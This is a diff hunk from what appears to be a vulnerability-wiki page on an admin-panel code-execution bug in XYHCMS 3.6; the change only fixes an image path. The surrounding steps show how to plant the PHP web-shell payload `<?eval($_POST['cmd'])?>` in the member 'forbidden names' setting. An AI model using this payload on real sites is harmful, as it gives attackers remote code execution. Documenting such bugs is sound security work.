@@ -39,7 +39,7 @@ XYHCMS 3.6
 
 1.  进入后台
 
-2.  系统设置-\>网站设置-\>会员配置-\>禁止使用的名称    ![1.png](/Users/aresx/Documents/VulWiki/.resource/XYHCMS3.6后台代码执行漏洞(二)/media/rId26.png){width="5.833333333333333in"
+2.  系统设置-\>网站设置-\>会员配置-\>禁止使用的名称    ![1.png](./.resource/XYHCMS3.6后台代码执行漏洞(二)/media/rId26.png){width="5.833333333333333in"
     height="2.553546587926509in"}
 
 -   <?eval($_POST['cmd'])?>
